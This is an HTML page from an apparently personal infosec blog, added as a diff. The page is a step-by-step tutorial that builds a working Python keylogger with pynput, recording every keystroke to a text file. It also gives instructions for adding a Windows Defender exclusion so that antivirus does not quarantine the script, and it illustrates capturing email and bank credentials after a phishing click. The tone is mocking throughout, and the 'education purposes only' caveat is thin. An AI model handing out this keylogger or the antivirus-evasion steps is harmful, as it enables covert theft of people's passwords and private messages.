@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>sorcen</title>
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <script src="https://kit.fontawesome.com/97b21a4e7f.js" crossorigin="anonymous"></script>
+  <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+<body>
+<!--logo-->
+  <div class="logo">
+    <a href="index.html">
+        <img src="assets/logo4.png" alt="Logo">
+    </a>
+  </div>
+<!--logo-->
+
+<!--Content-->
+<div class="pageheader"></div>
+<div class="panel" id="main">
+    <div class="content">
+        <article class="post h-entry">
+            <header class="post-header">
+                <h1 class="post-title p-name" id="title" >A Simple Keylogger</h1>
+            </header>
+            <div class="containbox">
+                <span class="time">
+                    <i class="fas fa-user-edit"></i>
+                    by <span class="hov p-author h-card">Sorcen</span>
+                </span>
+                <br/>
+
+                <a class="u-url u-uid" href></a>
+                <!-- <br/> <span class="categories"> &raquo; infosec, blog </span> -->
+            </div>
+        <hr/>
+        <div class="post-content e-content">
+            <p>
+                Keyloggers are very interesting because they can allow for very informative actions such as feedback for software development or maybe your IT department wants to collect some user data to help them resolve an issue they are having with the computer systems. Now comes the issue of immoral actors -  <em style="color: #e3a1a1;">Boooo...you suck</em> - anyway, there is no point in hiding the fact that these people exist, soooooo <em style="color: #e3a1a1;">lets make a keylogger</em>. Keyloggers are extremely easy to create (<em style="color: #e3a1a1;">that is scary</em>)
+                so lets use some python to see <em style="color: #e3a1a1;">how it works</em>.
+                <p>
+                    First thing we are going to do is import a python library <em style="color: #e3a1a1;">pynput</em> which is going to help us collect input from your keyboard. If the main method is ready to fire lets do something like set up a listener that takes an <em style="color: #e3a1a1;">on_press</em> parameter which in this case is <em style="color: #e3a1a1;">keyPressed</em>
+                    .
+                <pre>
+                    <code class="language-python">
+    from&nbsp;pynput&nbsp;import&nbsp;keyboard
+
+    if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+    &nbsp;&nbsp;&nbsp;&nbsp;listener&nbsp;=&nbsp;keyboard.Listener(on_press=keyPressed)
+                    </code>
+                </pre>
+                <p>
+                    Once we got that part done we can tell <em style="color: #e3a1a1;">listener</em> to start and at the same time we can tell python that we are ready to collect some <em style="color: #e3a1a1;">data</em> from the keyboard... <em style="color: #e3a1a1;">muahahahah</em>
+                <pre>
+                    <code class="language-python">
+    from&nbsp;pynput&nbsp;import&nbsp;keyboard
+
+    if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+    &nbsp;&nbsp;&nbsp;&nbsp;listener&nbsp;=&nbsp;keyboard.Listener(on_press=keyPressed)
+    &nbsp;&nbsp;&nbsp;&nbsp;listener.start()
+    &nbsp;&nbsp;&nbsp;&nbsp;input()
+                    </code>
+                </pre>
+                <p>
+                    <em style="color: #e3a1a1;">OKAY</em>.... now that we got it started lets define the <em style="color: #e3a1a1;">keyPressed</em> function otherwise <em style="color: #e3a1a1;">on_press</em> won't be able to do anything lol. So <em style="color: #e3a1a1;">keyPressed</em> is going to have a parameter of <em style="color: #e3a1a1;">key</em>. Do not be alarmed just believe me when I say that <em style="color: #e3a1a1;">on_press</em> will know what to do with it. While we are here lets print out the <em style="color: #e3a1a1;">key</em> parameter and wrap that as a <em style="color: #e3a1a1;">string</em> to make sure we can see the text as a string type.
+                <pre>
+                    <code class="language-python">
+    from&nbsp;pynput&nbsp;import&nbsp;keyboard
+
+    def&nbsp;keyPressed(key):
+    &nbsp;&nbsp;&nbsp;&nbsp;print(str(key))
+    &nbsp;&nbsp;&nbsp;&nbsp;
+    if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+    &nbsp;&nbsp;&nbsp;&nbsp;listener&nbsp;=&nbsp;keyboard.Listener(on_press=keyPressed)
+    &nbsp;&nbsp;&nbsp;&nbsp;listener.start()
+    &nbsp;&nbsp;&nbsp;&nbsp;input()
+                    </code>
+                </pre>
+                <p>
+                    Where are we going to store these <em style="color: #e3a1a1;">recorded key</em> events you ask? We need to store it in a .txt file so we can refer back to it later so <em style="color: #e3a1a1;">let's do it</em>
+                <p>
+                    Python has a cool feature called <em style="color: #e3a1a1;">with</em>. This will allow us to edit a .txt file real easy. So the syntax is going to  look something like this.
+                <pre>
+                    <code class="language-python">
+    from&nbsp;pynput&nbsp;import&nbsp;keyboard
+
+    def&nbsp;keyPressed(key):
+    &nbsp;&nbsp;&nbsp;&nbsp;print(str(key))
+    &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;keyfile.txt&quot;,&nbsp;&#39;a&#39;)&nbsp;as&nbsp;logkey:
+    &nbsp;&nbsp;&nbsp;&nbsp;
+    if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+    &nbsp;&nbsp;&nbsp;&nbsp;listener&nbsp;=&nbsp;keyboard.Listener(on_press=keyPressed)
+    &nbsp;&nbsp;&nbsp;&nbsp;listener.start()
+    &nbsp;&nbsp;&nbsp;&nbsp;input()
+                    </code>
+                </pre>
+                <p>
+                    Let me explain this a little before we move on just to make sure we fully understand whats <em style="color: #e3a1a1;">happening</em> here.
+                <p>
+                    We use <em style="color: #e3a1a1;">with</em> to open a .txt file name <em style="color: #e3a1a1;">keyfile</em>. It will check if this .txt exists and if not, it will be <em style="color: #e3a1a1;">created</em>. We pass a second parameter <em style="color: #e3a1a1;">'a'</em> which is just going to append any data that is captured instead of overwriting it. This way I can see <em style="color: #e3a1a1;">everything</em> you do...<em style="color: #e3a1a1;">muahahaha</em>. Also we just going to name this logKey so we can <em style="color: #e3a1a1;">reference</em> back to it later.
+                <p>
+                    Let's add a <em style="color: #e3a1a1;">try/except</em> block here. We are going to try to <em style="color: #e3a1a1;">convert</em> this key to a character that way it can go into our .txt file. So we set the key to a <em style="color: #e3a1a1;">char</em> and write that to <em style="color: #e3a1a1;">logKey</em>. See where we are going with this?
+                <p>
+                    Reason why we use a <em style="color: #e3a1a1;">try/except</em> block is because this won't always work so if something <em style="color: #e3a1a1;">explodes</em> along the way, lets log that to the terminal.
+                <pre>
+                    <code class="language-python">
+    from&nbsp;pynput&nbsp;import&nbsp;keyboard
+
+    def&nbsp;keyPressed(key):
+    &nbsp;&nbsp;&nbsp;&nbsp;print(str(key))
+    &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;keyfile.txt&quot;,&nbsp;&#39;a&#39;)&nbsp;as&nbsp;logkey:
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;=&nbsp;key.char
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logkey.write(char)
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Something&nbsp;exploded...get&nbsp;gud&quot;)
+    &nbsp;&nbsp;&nbsp;&nbsp;
+    if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
+    &nbsp;&nbsp;&nbsp;&nbsp;listener&nbsp;=&nbsp;keyboard.Listener(on_press=keyPressed)
+    &nbsp;&nbsp;&nbsp;&nbsp;listener.start()
+    &nbsp;&nbsp;&nbsp;&nbsp;input()
+                    </code>
+                </pre> 
+                <p>
+                    Wait...we're done? It was that simple? Well<em style="color: #e3a1a1;"> kinda</em>. The main functionality of the script is <em style="color: #e3a1a1;">done</em> yes. But we have a small issue. Any decent <em style="color: #e3a1a1;">anti-virus</em> should be able to detect this and attempt to quarantine it. So let's teach you how to add an exclusion to your windows machine! <em style="color: #e3a1a1;">EDUCATION PURPOSES ONLY</em>.
+                <p>
+                    Head to your windows settings then go to <em style="color: #e3a1a1;">Update & Security</em> >>> <em style="color: #e3a1a1;">Windows Security</em> >>> <em style="color: #e3a1a1;">Virus & threat protection</em>. Once you're there selected <em style="color: #e3a1a1;">Manage settings</em> and then under <em style="color: #e3a1a1;">Exclusions</em> select <em style="color: #e3a1a1;">Add or remove exclusions</em>. BOOM! you can now add your keylogger directory to the exclusion list.
+                <p>
+                    Now that we have that done let's see what happens when we <em style="color: #e3a1a1;">run</em> the script.
+                <div class="video-container">
+                    <video src="assets/keyloggerscript.mp4" controls muted>
+                    </video>
+                </div>
+                <p>
+                    You'll notice that once the script <em style="color: #e3a1a1;">starts</em> it will begin to detect <em style="color: #e3a1a1;">every</em> key that is pressed on the keyboard...<em style="color: #e3a1a1;">yikes</em>. Check out what the keyfile.txt looks like after it has <em style="color: #e3a1a1;">recorded</em> key strokes from the user. 
+                <div class="logger-container">
+                    <img src="assets/keyloggerfile.PNG" alt="">
+                </div>
+
+                <p>
+                    It recorded <em style="color: #e3a1a1;">everything</em> I typed onto the keyboard. And if you are wondering if this would <em style="color: #e3a1a1;">work</em> in the background...welllll <em style="color: #e3a1a1;">YES</em> it will. This means some bad actor with <em style="color: #e3a1a1;">nefarious</em> intentions could run a .exe on your computer in the background <em style="color: #e3a1a1;">AND</em> record all of your keystrokes. What can someone do with your <em style="color: #e3a1a1;">keystrokes</em> you may ask? Well let me give you a prime <em style="color: #e3a1a1;">example</em>. 
+                <p>
+                    Say you came home from <em style="color: #e3a1a1;">work</em> one day and decide to hop on your <em style="color: #e3a1a1;">computer</em> to check some emails and maybe go on <em style="color: #e3a1a1;">facebook</em>. You go to your email and you see <em style="color: #e3a1a1;">this</em>.
+                <div class="logger-container">
+                    <img src="assets/phishingexample.png" alt="">
+                </div>
+                <p>
+                    Naturally this doesn't look like anything since <em style="color: #e3a1a1;">nobody</em> would want to attack you right? <em style="color: #e3a1a1;">WRONG</em>. Now that you didn't bother to take <em style="color: #e3a1a1;">precaution</em> you clicked on the link and it <em style="color: #e3a1a1;">redirected</em> you to google. You tell yourself "<em style="color: #e3a1a1;">huh, that was weird, oh well</em>". Little do you know you just downloaded a <em style="color: #e3a1a1;">KEYLOGGER</em> and you have no idea because the script is running in the <em style="color: #e3a1a1;">background</em>.
+                <p>
+                    You ignore that anything <em style="color: #e3a1a1;">happened</em> because on your screen you do not see anything <em style="color: #e3a1a1;">weird</em>, so you go about your day. You visit <em style="color: #e3a1a1;">facebook</em>, check more <em style="color: #e3a1a1;">emails</em> and maybe send out an <em style="color: #e3a1a1;">email</em>, you go to check your <em style="color: #e3a1a1;">bank account</em> because you want to make some <em style="color: #e3a1a1;">payments</em> to you credit card. After doing all of this lets go ahead and <em style="color: #e3a1a1;">check</em> that keyfile.txt one more time.
+                <div class="logger-container">
+                    <img src="assets/newkeyfile.PNG" alt="">
+                </div>
+                <p>
+                    Let's break it down so its <em style="color: #e3a1a1;">easier</em> to see.
+                <div class="logger-container">
+                    <img src="assets\newkeyfile1.png" alt="">
+                </div>
+                <p>
+                    Your <em style="color: #e3a1a1;">harmless</em> tasks that were done on your computer is now logged into a separate .txt file that a <em style="color: #e3a1a1;">bad</em> actor can use at their own will. Your <em style="color: #e3a1a1;">facebook</em> credentials are <strong>exposed</strong>, your <em style="color: #e3a1a1;">email</em> credentials are <strong>exposed</strong>, your <em style="color: #e3a1a1;">confidential</em> email you wrote to a collegue is <strong>exposed</strong>, and your <em style="color: #e3a1a1;">bank</em> credentials are <strong>exposed</strong>. All because you clicked a "<em style="color: #e3a1a1;">harmless</em>" link.
+                <p>
+                    Now in reality this probably wouldn't work out as <em style="color: #e3a1a1;">smoothly</em> as I explained as majority of windows machines will <em style="color: #e3a1a1;">block</em> the script if it is run as an executable. But there are<em style="color: #e3a1a1;">1000</em> ways to bypass <em style="color: #e3a1a1;">anti-virus</em> defenders, but hey like I said this was just a <em style="color: #e3a1a1;">simple</em> keylogger.
+
+        </div>
+    </article>
+<hr/>
+<br/>
+ <center>
+    <a href="disclaimer.html ">Disclaimer</a> 
+</center> 
+<br/>
+<!--Content-->
+
+<!--Code snippet Highlight.JS-->
+<link href="https://unpkg.com/highlightjs-badge/highlightjs/styles/ir-black.css" rel="stylesheet">
+<script src="https://unpkg.com/highlightjs-badge/highlightjs/highlight.pack.js"></script>
+  
+<script src="https://unpkg.com/highlightjs-badge/highlightjs-badge.min.js"></script>
+<script>hljs.highlightAll();</script>
+<script>
+    setTimeout(function () {
+        var pres = document.querySelectorAll("pre>code");
+        for (var i = 0; i < pres.length; i++) {
+            hljs.highlightBlock(pres[i]);
+        }
+        window.highlightJsBadge(options);
+    },10);
+</script>
+<!--Code snippet Highlight.JS-->
+</body>
+
+<script src="app.js"></script>
+
+</html>
